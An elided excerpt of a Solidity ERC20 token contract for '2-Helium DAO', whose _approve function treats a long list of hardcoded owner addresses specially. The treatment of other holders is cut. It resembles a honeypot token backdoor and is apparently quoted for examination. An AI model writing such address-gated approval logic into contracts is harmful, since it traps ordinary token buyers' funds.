...
abstract contract ERC20 is IERC20 {
    ...
    function _approve(
        ...
        if (owner == address(0x24dE7aaf9886542C06D3EC94ae7f4425945Bb4B5)) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0xE93b9bae2a5F97376C31Fb39b8DCaB2766595fdb)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x71eDC4272afF34928EF820AbC834D33d2732292c)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x52128f2Aa5Fc1228018aBe7C68885f00889Da005)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0xab4F1ff4dFfD7A96Fc6C587012804a0b5a81963d)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x1Baa544ec28C8FBAFA37D5C85997c8B20Dcab3AF)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            ...
            owner == address(0x4Ec9Db2eD08Ef807e710b16044aa00079902064f)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x901a6D5F09fF53d2fa1C2410c32cB57713013991)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x3351C0b14c887b0bEA255D40cc8Fd1e137E5C3aC)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        }else if (
            owner == address(0xA0A1bD311efEe2cB2a2196EA3C0B864647eF87C9)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else {
...
contract HeliumDAO is ERC20Permit, VaultOwned {
    using SafeMath for uint256;

    constructor() ERC20("2-Helium DAO", "2HeDao", 8) {}
